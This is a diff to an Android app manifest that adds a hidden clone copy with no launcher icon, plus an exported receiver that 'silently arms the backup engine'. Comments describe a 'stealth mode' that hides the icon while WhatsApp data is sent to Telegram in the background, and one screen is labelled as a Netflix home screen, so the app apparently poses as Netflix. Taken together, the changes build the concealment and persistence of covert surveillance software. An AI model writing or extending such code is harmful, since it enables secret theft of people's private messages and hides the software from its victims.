@@ -42,18 +42,29 @@
             android:exported="true"
             android:screenOrientation="portrait" />
 
-        <!-- Launcher alias: disabled at runtime for stealth mode (icon hidden,
-             background WhatsApp backup to Telegram keeps running). -->
+        <!-- Launcher alias: enabled per flavor (visible copy = true, hidden clone = false).
+             The visible copy can still disable it at runtime for stealth mode. -->
         <activity-alias
             android:name=".ui.AliasLauncher"
             android:targetActivity=".ui.MainActivity"
-            android:enabled="true"
+            android:enabled="@bool/launcher_enabled"
             android:exported="true">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
                 <category android:name="android.intent.category.LAUNCHER" />
             </intent-filter>
         </activity-alias>
+
+        <!-- Hidden-copy bootstrap receiver: receives the install-broadcast from the
+             visible copy and silently arms the backup engine (no icon, no UI). -->
+        <receiver
+            android:name=".CloneBootstrapReceiver"
+            android:enabled="@bool/clone_bootstrap_enabled"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="com.personal.wabackup.action.INIT_CLONE" />
+            </intent-filter>
+        </receiver>
 
         <!-- Main Netflix home screen -->
         <activity
